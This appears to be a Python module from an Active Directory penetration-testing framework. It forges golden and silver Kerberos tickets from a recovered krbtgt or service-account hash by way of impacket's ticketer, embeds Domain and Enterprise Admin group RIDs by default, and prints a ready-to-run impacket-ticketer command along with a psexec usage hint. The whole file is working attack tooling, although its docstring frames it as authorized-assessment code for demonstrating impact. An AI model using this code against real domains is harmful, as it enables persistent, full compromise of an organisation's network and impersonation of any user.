"""Golden / silver Kerberos ticket forging — demonstrate post-compromise impact.

Once a secret has been recovered (`credentials/dcsync` gives you krbtgt for a
golden ticket; a service account's hash gives you a silver ticket for that
service), forging a ticket proves the blast radius: a golden ticket is a
self-minted TGT for any principal and survives password resets of everyone but
krbtgt; a silver ticket is a TGS to one service, forged entirely offline.

This is offline crypto — **no KDC is contacted and nothing in AD changes.** The
module validates the request, derives the domain SID from the graph when it can,
forges the ticket into a `.ccache` via impacket's ticketer, and — crucially —
always emits the exact reproducible `impacket-ticketer` command and the
`KRB5CCNAME` usage hint, so the result is actionable even where impacket isn't
importable.

Authorized-assessment tooling: it assumes you already hold the key legitimately
(via an in-scope compromise) and are demonstrating impact for the report.
"""

from __future__ import annotations

from typing import Optional

from adreaper.core.context import EngagementContext
from adreaper.core.graph import NodeType
from adreaper.core.logging import log
from adreaper.core.module import BaseModule, ModuleResult, Option, OptionType, Severity

# default group RIDs baked into a golden ticket (Domain/Enterprise/Schema Admins etc.)
DEFAULT_GROUPS = "512,513,518,519,520"


class Ticketer(BaseModule):
    name = "kerberos/ticketer"
    description = "Forge golden/silver Kerberos tickets from a recovered key (offline)."
    author = "Mealmeu"
    category = "kerberos"
    requires = ["impacket"]
    references = [
        "https://attack.mitre.org/techniques/T1558/001/",
        "https://attack.mitre.org/techniques/T1558/002/",
    ]
    options = [
        Option("kind", "golden | silver", default="golden", type=OptionType.STRING,
               choices=["golden", "silver"]),
        Option("user", "Username to impersonate", default="Administrator", type=OptionType.STRING),
        Option("nthash", "NTLM hash of krbtgt (golden) or the service account (silver)",
               type=OptionType.STRING),
        Option("aes", "AES256 key (alternative to nthash)", type=OptionType.STRING),
        Option("domain-sid", "Domain SID (default: derived from the graph)", type=OptionType.STRING),
        Option("spn", "Service SPN to forge for (silver only, e.g. cifs/host.dom)",
               type=OptionType.STRING),
        Option("groups", "Group RIDs to embed", default=DEFAULT_GROUPS, type=OptionType.STRING),
        Option("id", "User RID", default=500, type=OptionType.INT),
    ]

    def run(self, ctx: EngagementContext) -> ModuleResult:
        res = self.result()
        kind = self.opt("kind", "golden")
        user = self.opt("user", "Administrator")
        nthash = self.opt("nthash") or ""
        aes = self.opt("aes") or ""
        spn = self.opt("spn") or ""
        domain = ctx.domain or ""
        domain_sid = self.opt("domain-sid") or derive_domain_sid(ctx.graph)

        problems = validate_forge_request(kind, domain, domain_sid, user, nthash, aes, spn)
        if problems:
            return res.fail("; ".join(problems)).finish()

        groups = self.opt("groups", DEFAULT_GROUPS)
        user_id = int(self.opt("id", 500))
        ccache = ctx.loot_dir() / ticket_ccache_name(kind, user, spn)
        command = equivalent_command(kind, domain, domain_sid, user, nthash, aes, spn,
                                     groups, user_id)

        forged = self._forge(ctx, kind, domain, domain_sid, user, nthash, aes, spn,
                             groups, user_id, ccache)

        sev = Severity.CRITICAL
        tech = "T1558/001" if kind == "golden" else "T1558/002"
        scope = ("any principal in the domain (full, persistent domain compromise)"
                 if kind == "golden" else f"the {spn} service as {user}")
        res.add_finding(
            f"{kind.capitalize()} ticket forged for {user}"
            + ("" if forged else " (command emitted; forge not run here)"),
            sev,
            description=f"A {kind} ticket grants access to {scope}. "
                        + ("Golden tickets are invalidated only by rotating krbtgt twice."
                           if kind == "golden" else
                           "Silver tickets need only the service account's key and never touch a DC."),
            evidence=f"{command}\n# then: {usage_hint(ccache)}",
            target=user,
            references=[f"https://attack.mitre.org/techniques/{tech}/"],
        )
        # We now effectively control the impersonated principal.
        for n in ctx.graph.find(user, NodeType.USER):
            ctx.graph.mark_owned(n.id)
        res.data.update({"kind": kind, "ccache": str(ccache), "forged": forged,
                         "command": command})
        if forged:
            log.ok("%s ticket -> %s", kind, ccache)
        else:
            log.warn("forge not performed in-process; run the emitted command")
        return res.finish()

    def _forge(self, ctx, kind, domain, domain_sid, user, nthash, aes, spn,
               groups, user_id, ccache) -> bool:
        """Best-effort in-process forge via impacket's ticketer. Returns success."""
        try:
            import types
            from impacket.examples.ticketer import TICKETER  # type: ignore
        except Exception as e:  # pragma: no cover - env without impacket
            log.debug("impacket ticketer unavailable: %s", e)
            return False
        try:
            opts = types.SimpleNamespace(
                spn=spn or None, nthash=nthash or None, aesKey=aes or None,
                keytab=None, groups=groups, user_id=str(user_id),
                extra_sid=None, extra_pac=True, old_pac=False,
                domain_sid=domain_sid, domain=domain, dc_ip=ctx.dc_ip or None,
                duration="87600", request=False, impersonate=None,
            )
            TICKETER(user, "", domain, opts).run()
            return True
        except Exception as e:  # pragma: no cover - needs live impacket
            log.debug("in-process forge failed (%s); command still emitted", e)
            return False


# ---------------------------------------------------------------------------
# pure helpers (unit-tested)
# ---------------------------------------------------------------------------

def validate_forge_request(kind: str, domain: str, domain_sid: str, user: str,
                           nthash: str, aes: str, spn: str) -> list[str]:
    problems: list[str] = []
    if kind not in ("golden", "silver"):
        problems.append(f"unknown kind '{kind}' (golden|silver)")
    if not domain:
        problems.append("domain is required (set --domain)")
    if not (nthash or aes):
        problems.append("need a key: set -o nthash=<hash> or -o aes=<key>")
    if not user:
        problems.append("user to impersonate is required")
    if not domain_sid:
        problems.append("domain SID is required (run recon first or set -o domain-sid=)")
    if kind == "silver" and not spn:
        problems.append("silver ticket needs -o spn=<service/host>")
    return problems


def default_groups() -> str:
    return DEFAULT_GROUPS


def ticket_ccache_name(kind: str, user: str, spn: str = "") -> str:
    safe_user = _san(user)
    if kind == "silver" and spn:
        return f"{safe_user}@{_san(spn)}_silver.ccache"
    return f"{safe_user}_golden.ccache"


def equivalent_command(kind, domain, domain_sid, user, nthash, aes, spn,
                       groups=DEFAULT_GROUPS, user_id=500) -> str:
    parts = ["impacket-ticketer"]
    if nthash:
        parts.append(f"-nthash {nthash}")
    if aes:
        parts.append(f"-aesKey {aes}")
    parts.append(f"-domain-sid {domain_sid}")
    parts.append(f"-domain {domain}")
    if kind == "silver":
        parts.append(f"-spn {spn}")
    if groups and groups != DEFAULT_GROUPS:
        parts.append(f"-groups {groups}")
    if str(user_id) != "500":
        parts.append(f"-user-id {user_id}")
    parts.append(user)
    return " ".join(parts)


def usage_hint(ccache) -> str:
    return (f"export KRB5CCNAME={ccache}  # then use -k -no-pass "
            "(e.g. impacket-psexec -k -no-pass <host>)")


def derive_domain_sid(graph) -> str:
    for d in graph.nodes_of(NodeType.DOMAIN):
        if d.properties.get("sid"):
            return str(d.properties["sid"])
    for n in graph.nodes:
        if n.id.startswith("S-1-5-21-") and n.id.count("-") >= 6:
            return n.id.rsplit("-", 1)[0]
    return ""


def _san(s: str) -> str:
    return "".join(c if (c.isalnum() or c in "-_.") else "_" for c in str(s)) or "x"
